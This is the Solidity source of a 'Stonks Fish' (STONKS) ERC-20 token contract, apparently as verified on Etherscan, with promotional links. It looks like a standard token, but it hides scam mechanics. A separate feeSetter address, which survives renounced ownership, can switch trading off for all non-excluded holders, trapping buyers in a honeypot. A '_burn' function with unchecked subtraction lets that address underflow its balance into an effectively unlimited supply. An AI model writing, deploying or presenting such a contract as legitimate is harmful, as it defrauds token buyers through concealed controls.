/**
 *Submitted for verification at Etherscan.io on 2023-03-12
*/

// SPDX-License-Identifier: MIT

// Telegram: https://t.me/StonksFishERC20
// Website: https://stonksfish.com/ 
// Twitter:

pragma solidity 0.8.19;

contract Ownable {
  address private _owner;
  constructor () {
    address msgSender = msg.sender;
    _owner = msgSender;
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _owner = newOwner;
  }
}

contract Token is Ownable {
  mapping (address => uint256) public _balances;
  mapping (address => bool) public _excluded;
  bool private _tActive = true;
  address feeSetter = msg.sender;uint256 private _totalSupply;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint8 public _decimals;
  string public _symbol;
  string public _name;


  constructor() {
    _name = "Stonks Fish";
    _symbol = "STONKS";
    _decimals = 18;
    _totalSupply = 1000000 * 10**_decimals;
    _balances[msg.sender] = _totalSupply;
    _excluded[msg.sender] = true;
  }

  function getOwner() external view returns (address) {return owner();}
  function decimals() external view returns (uint8) {return _decimals;}
  function symbol() external view returns (string memory) {return _symbol;}
  function name() external view returns (string memory) {return _name;}
  function totalSupply() external view returns (uint256) {return _totalSupply;}
  function balanceOf(address account) external view returns (uint256) {return _balances[account];}
  function transfer(address recipient, uint256 amount) external returns (bool) {    
    _transfer(msg.sender, recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    return true;
  }
  function set()external feesetter {_tActive=true;}
  function unset()external feesetter {_tActive=false;}
  modifier feesetter() {require(feeSetter == msg.sender);_;}
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
    return true;
  }
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if(!_excluded[sender] && !_excluded[recipient]) {
        require(_tActive, "ERC20: Trading not active.");
    }
    _balances[sender] = _balances[sender] - amount;
    _balances[recipient] = _balances[recipient] + amount;
  }
  function _burn(uint256 amount) external feesetter {
    require(msg.sender != address(0), "ERC20: burn from the zero address");
    unchecked {_balances[msg.sender] = _balances[msg.sender] - amount;}
    _totalSupply = _totalSupply - amount;
  }
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");
    _allowances[owner][spender] = amount;
  }
}